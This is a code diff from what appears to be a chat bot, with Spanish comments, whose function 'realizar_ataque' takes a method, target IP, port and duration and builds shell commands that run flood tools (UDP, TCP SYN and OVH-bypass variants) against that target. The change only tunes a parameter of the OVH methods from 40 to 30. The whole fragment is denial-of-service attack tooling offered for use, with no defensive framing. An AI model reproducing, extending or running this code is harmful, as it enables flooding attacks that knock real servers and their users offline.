@@ -169,9 +169,9 @@ async def realizar_ataque(ctx, metodo: str, ip: str, port: str, tiempo: str):
     elif metodo == 'udppps':
         comando = f'./udppps {ip} {port_int} {tiempo_int}'
     elif metodo == 'ovhudp':
-        comando = f'sudo ./ovhudp {ip} {port_int} 40 -1 {tiempo_int}'
+        comando = f'sudo ./ovhudp {ip} {port_int} 30 -1 {tiempo_int}'
     elif metodo == 'ovhtcp':
-        comando = f'sudo ./ovhtcp {ip} {port_int} 40 -1 {tiempo_int}'
+        comando = f'sudo ./ovhtcp {ip} {port_int} 30 -1 {tiempo_int}'
     elif metodo == 'tcp':
         comando = f'./tcp {ip} {port_int} {tiempo_int}'  # Asumiendo que tcp-syn es el script para SYN
     else:
